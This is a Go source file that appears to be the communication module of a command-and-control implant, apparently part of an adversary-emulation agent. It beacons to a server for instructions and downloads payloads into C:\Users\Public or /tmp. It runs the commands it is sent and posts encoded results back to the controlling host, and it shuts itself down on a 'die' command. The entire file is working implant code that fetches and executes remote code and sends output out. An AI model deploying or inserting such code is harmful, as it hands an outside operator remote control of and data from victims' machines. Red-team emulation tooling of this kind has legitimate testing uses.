package contact

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"

	"../execute"
	"../util"
)

const (
	ok = 200
)

//API communicates through HTTP
type API struct{}

//Ping tests connectivity to the server
func (contact API) Ping(server string) bool {
	address := fmt.Sprintf("%s/sand/ping", server)
	bites := request(address, nil)
	if string(bites) == "pong" {
		fmt.Println("[+] Ping success")
		return true
	}
	fmt.Println("[+] Ping failure")
	return false
}

//GetInstructions sends a beacon and returns instructions
func (contact API) GetInstructions(profile map[string]interface{}) map[string]interface{} {
	data, _ := json.Marshal(profile)
	address := fmt.Sprintf("%s/sand/instructions", profile["server"])
	bites := request(address, data)
	var out map[string]interface{}
	if bites != nil {
		fmt.Println("[+] beacon: ALIVE")
		var commands interface{}
		json.Unmarshal(bites, &out)
		json.Unmarshal([]byte(out["instructions"].(string)), &commands)
		out["sleep"] = int(out["sleep"].(float64))
		out["instructions"] = commands
	} else {
		fmt.Println("[-] beacon: DEAD")
	}
	return out
}

//DropPayloads downloads all required payloads for a command
func (contact API) DropPayloads(payload string, server string) []string {
	payloads := strings.Split(strings.Replace(payload, " ", "", -1), ",")
	var droppedPayloads []string
	for _, payload := range payloads {
		if len(payload) > 0 {
			droppedPayloads = append(droppedPayloads, drop(server, payload))
		}
	}
	return droppedPayloads
}

//RunInstruction runs a single instruction
func (contact API) RunInstruction(command map[string]interface{}, profile map[string]interface{}, payloads []string, msfmux *sync.Mutex) {
	// fmt.Printf("Command is: %s ", command["command"].(string))
	cmd, result, status := execute.RunCommand(command["command"].(string), payloads, profile["platform"].(string), command["executor"].(string), msfmux)
	sendExecutionResults(command["id"], profile["server"], result, status, cmd)
}

func drop(server string, payload string) string {
    var location string
    if runtime.GOOS == "windows" {
        location = filepath.Join("C:\\", "Users", "Public", payload)
    } else{
    	location = filepath.Join("/tmp", payload)
    }

	if len(payload) > 0 && util.Exists(location) == false {
		fmt.Println(fmt.Sprintf("[*] Downloading new payload: %s", payload))
		address := fmt.Sprintf("%s/file/download", server)
		req, _ := http.NewRequest("POST", address, nil)
		req.Header.Set("file", payload)
		req.Header.Set("platform", string(runtime.GOOS))
		fmt.Println(fmt.Sprintf("[*] GOOS is : %s", string(runtime.GOOS)))
		client := &http.Client{}
		resp, err := client.Do(req)
		if err == nil && resp.StatusCode == ok {
			util.WritePayload(location, resp)
		}
	}
	return location
}

func sendExecutionResults(commandID interface{}, server interface{}, result []byte, status string, cmd string) {
	address := fmt.Sprintf("%s/sand/results", server)
	link := fmt.Sprintf("%f", commandID.(float64))
	data, _ := json.Marshal(map[string]string{"link_id": link, "output": string(util.Encode(result)), "status": status})
	request(address, data)
	if cmd == "die" {
		fmt.Println("[+] Shutting down...")
		util.StopProcess(os.Getpid())
	}
}

func request(address string, data []byte) []byte {
	req, _ := http.NewRequest("POST", address, bytes.NewBuffer(util.Encode(data)))
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := ioutil.ReadAll(resp.Body)
	return util.Decode(string(body))
}
